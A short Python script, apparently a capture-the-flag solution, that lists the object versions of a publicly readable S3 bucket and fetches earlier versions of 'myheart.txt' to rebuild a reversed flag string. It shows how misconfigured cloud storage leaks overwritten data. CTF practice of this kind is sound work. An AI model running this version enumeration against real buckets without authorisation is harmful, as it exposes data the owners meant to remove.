import requests
import xml.etree.ElementTree as ET

res = requests.get('http://forever.lychnobyte.my.id.s3.amazonaws.com/?versions')

root = ET.fromstring(res.text)

all_versions = []

for versions in root.findall('{http://s3.amazonaws.com/doc/2006-03-01/}Version'):
    version_id = versions.find('{http://s3.amazonaws.com/doc/2006-03-01/}VersionId').text
    file_name = versions.find('{http://s3.amazonaws.com/doc/2006-03-01/}Key').text
    if file_name == "myheart.txt":
        all_versions.append(version_id)

flag = ""

for version in all_versions[1:]:
    res = requests.get('http://forever.lychnobyte.my.id.s3.amazonaws.com/myheart.txt?versionId=' + version)
    flag += res.text.strip()

print(flag[::-1])